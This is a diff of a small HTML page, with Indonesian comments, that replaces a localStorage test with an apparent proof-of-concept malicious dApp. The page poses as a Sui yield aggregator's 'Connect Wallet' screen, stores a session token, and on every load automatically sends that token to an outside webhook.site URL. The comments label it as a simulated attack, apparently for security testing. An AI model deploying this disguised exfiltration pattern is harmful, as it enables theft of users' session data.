@@ -2,39 +2,41 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Uji Data Persistence</title>
+    <title>Sui Yield Aggregator - Connect Wallet</title>
 </head>
 <body style="font-family: sans-serif; padding: 20px;">
-    <h1>Uji Data Persistence (WebView)</h1>
+    <h1>Yield Aggregator Dashboard</h1>
+    <p>Hubungkan dompet Anda untuk melihat pendapatan harian.</p>
     
-    <div id="status-box" style="border: 1px solid #ccc; padding: 10px; margin-bottom: 20px;">
-        <p>Data Tersimpan: <strong id="data-display">Tidak ada</strong></p>
-    </div>
-
-    <input type="text" id="userInput" placeholder="Masukkan teks rahasia...">
-    <button onclick="saveData()">Simpan Data</button>
-    <button onclick="clearData()" style="color: red;">Hapus Data Manual</button>
+    <button id="connectBtn" onclick="initiateSession()">Hubungkan Dompet</button>
 
     <script>
-        function updateDisplay() {
-            const saved = localStorage.getItem('test_secret');
-            document.getElementById('data-display').innerText = saved ? saved : "Tidak ada data";
+        // 1. Skenario Nyata: Penyimpanan Sesi secara diam-diam
+        function initiateSession() {
+            // Simulasi token sesi yang dicuri atau dibuat oleh dApp
+            const sessionToken = "sess_" + Math.random().toString(36).substr(2, 9);
+            
+            // Menyimpan ke LocalStorage agar tetap ada setelah aplikasi ditutup/force close
+            localStorage.setItem('dapp_session_id', sessionToken);
+            
+            alert("Terhubung! Sesi tersimpan: " + sessionToken);
+            console.log("Sesi persistensi diaktifkan.");
         }
 
-        function saveData() {
-            const val = document.getElementById('userInput').value;
-            localStorage.setItem('test_secret', val);
-            alert("Data tersimpan di LocalStorage!");
-            updateDisplay();
-        }
-
-        function clearData() {
-            localStorage.removeItem('test_secret');
-            updateDisplay();
-        }
-
-        // Tampilkan data saat halaman dimuat
-        updateDisplay();
+        // 2. Skenario Nyata: Pencurian data otomatis saat aplikasi dibuka kembali
+        // dApp jahat akan mencoba mengirim "Session Token" ke server penyerang
+        window.addEventListener('load', () => {
+            const savedSession = localStorage.getItem('dapp_session_id');
+            if (savedSession) {
+                console.warn("Data sesi ditemukan, melakukan eksfiltrasi ke server penyerang...");
+                
+                // Mengirimkan token ke server luar secara otomatis (Exfiltration)
+                // Ini adalah perilaku dApp yang berbahaya
+                fetch('https://webhook.site/log-session?token=' + savedSession, {
+                    method: 'GET'
+                });
+            }
+        });
     </script>
 </body>
 </html>
